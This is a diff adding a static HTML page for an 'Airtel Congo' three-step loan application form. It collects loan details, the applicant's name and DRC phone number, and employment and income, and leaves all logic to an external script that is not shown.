@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Airtel Congo - Loan Application</title>
+  <link rel="stylesheet" href="css/styles.css">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><circle cx='16' cy='16' r='16' fill='%23E51937'/><text x='16' y='22' font-family='Georgia, serif' font-size='18' font-weight='bold' fill='%23ffffff' text-anchor='middle'>a</text></svg>">
+</head>
+<body>
+
+  <!-- Navigation Bar -->
+  <header class="navbar">
+    <a href="index.html" class="nav-brand">
+      <div class="brand-icon">a</div>
+      <div class="brand-text">
+        <span class="brand-title">Airtel Congo</span>
+        <span class="brand-subtitle">Loan Application</span>
+      </div>
+    </a>
+    <div class="nav-actions">
+      <a href="index.html" id="navRightLink" class="nav-link">Home</a>
+    </div>
+  </header>
+
+  <!-- Main Content Wrapper -->
+  <main class="main-wrapper">
+    <div class="card-container">
+      <div class="card-top-bar"></div>
+
+      <!-- Card Title & Dynamic Step Subtitle -->
+      <div class="card-header">
+        <h1 class="card-title">Loan Application</h1>
+        <p class="card-subtitle" id="stepSubtitle">Step 1 of 3</p>
+      </div>
+
+      <!-- Segmented Multi-Step Progress Indicator -->
+      <div class="progress-bar-container" aria-label="Application Progress">
+        <div id="seg1" class="progress-segment active"></div>
+        <div id="seg2" class="progress-segment"></div>
+        <div id="seg3" class="progress-segment"></div>
+      </div>
+
+      <!-- =======================================================
+           STEP 1: LOAN DETAILS (IMAGE 2)
+      ======================================================= -->
+      <div id="stepCard1" class="step-card">
+        <div class="form-group">
+          <label class="form-label" for="loanType">Loan Type</label>
+          <select id="loanType" class="form-select">
+            <option value="Business Loan" selected>Business Loan</option>
+            <option value="Personal Loan">Personal Loan</option>
+            <option value="Emergency Loan">Emergency Loan</option>
+            <option value="Education Loan">Education Loan</option>
+            <option value="Salary Advance">Salary Advance</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label" for="loanAmount">Loan Amount ($)</label>
+          <input 
+            type="number" 
+            id="loanAmount" 
+            class="form-input" 
+            placeholder="1000" 
+            value="1000"
+            min="50"
+            max="10000"
+          >
+        </div>
+
+        <div class="form-group">
+          <label class="form-label" for="loanTerm">Loan Term</label>
+          <select id="loanTerm" class="form-select">
+            <option value="6 Months">6 Months</option>
+            <option value="12 Months">12 Months</option>
+            <option value="24 Months">24 Months</option>
+            <option value="36 Months">36 Months</option>
+            <option value="48 Months" selected>48 Months</option>
+            <option value="60 Months">60 Months</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label" for="loanPurpose">Purpose of Loan</label>
+          <textarea 
+            id="loanPurpose" 
+            class="form-textarea" 
+            placeholder="Describe the purpose of your loan..."
+            rows="3"
+          ></textarea>
+        </div>
+
+        <button type="button" id="step1NextBtn" class="btn-primary" style="margin-top: 22px;">NEXT STEP</button>
+      </div>
+
+      <!-- =======================================================
+           STEP 2: APPLICANT DETAILS (IMAGE 3)
+      ======================================================= -->
+      <div id="stepCard2" class="step-card" style="display: none;">
+        <div class="form-row">
+          <div class="form-group">
+            <label class="form-label" for="firstName">First Name</label>
+            <input type="text" id="firstName" class="form-input" placeholder="First Name" required>
+          </div>
+          <div class="form-group">
+            <label class="form-label" for="lastName">Last Name</label>
+            <input type="text" id="lastName" class="form-input" placeholder="Last Name" required>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label" for="phone">Phone Number</label>
+          <div class="phone-input-group">
+            <span class="phone-prefix">+243</span>
+            <input 
+              type="tel" 
+              id="phone" 
+              class="form-input" 
+              placeholder="812345678" 
+              maxlength="9"
+              required
+            >
+          </div>
+          <div class="form-helper">Enter 9 digits for DRC</div>
+        </div>
+
+        <div class="btn-group">
+          <button type="button" id="step2PrevBtn" class="btn-secondary">PREVIOUS</button>
+          <button type="button" id="step2NextBtn" class="btn-primary">NEXT STEP</button>
+        </div>
+      </div>
+
+      <!-- =======================================================
+           STEP 3: EMPLOYMENT & SUMMARY (IMAGE 5)
+      ======================================================= -->
+      <div id="stepCard3" class="step-card" style="display: none;">
+        <div class="form-group">
+          <label class="form-label" for="employmentStatus">Employment Status</label>
+          <select id="employmentStatus" class="form-select">
+            <option value="Self-Employed" selected>Self-Employed</option>
+            <option value="Employed (Full-Time)">Employed (Full-Time)</option>
+            <option value="Employed (Part-Time)">Employed (Part-Time)</option>
+            <option value="Business Owner">Business Owner</option>
+            <option value="Civil Servant">Civil Servant</option>
+            <option value="Freelancer / Contractor">Freelancer / Contractor</option>
+            <option value="Other">Other</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label" for="annualIncome">Annual Income ($)</label>
+          <input 
+            type="number" 
+            id="annualIncome" 
+            class="form-input" 
+            placeholder="Enter annual income"
+          >
+        </div>
+
+        <!-- Application Summary Card Component -->
+        <div class="summary-box">
+          <div class="summary-title">Application Summary</div>
+          <div class="summary-item">
+            <span class="summary-label">Loan Amount:</span>
+            <span class="summary-val" id="summaryAmount">$1,000</span>
+          </div>
+          <div class="summary-item">
+            <span class="summary-label">Loan Term:</span>
+            <span class="summary-val" id="summaryTerm">48 Months</span>
+          </div>
+          <div class="summary-item">
+            <span class="summary-label">Purpose:</span>
+            <span class="summary-val" id="summaryPurpose">Personal / Business</span>
+          </div>
+          <div class="summary-item">
+            <span class="summary-label">Applicant:</span>
+            <span class="summary-val" id="summaryApplicant">Not specified</span>
+          </div>
+        </div>
+
+        <div class="btn-group">
+          <button type="button" id="step3PrevBtn" class="btn-secondary">PREVIOUS</button>
+          <button type="button" id="step3SubmitBtn" class="btn-primary">SUBMIT APPLICATION</button>
+        </div>
+      </div>
+
+    </div>
+  </main>
+
+  <!-- Light Footer -->
+  <footer class="footer-light">
+    &copy; 2026 Airtel Congo
+  </footer>
+
+  <script src="js/application.js"></script>
+</body>
+</html>
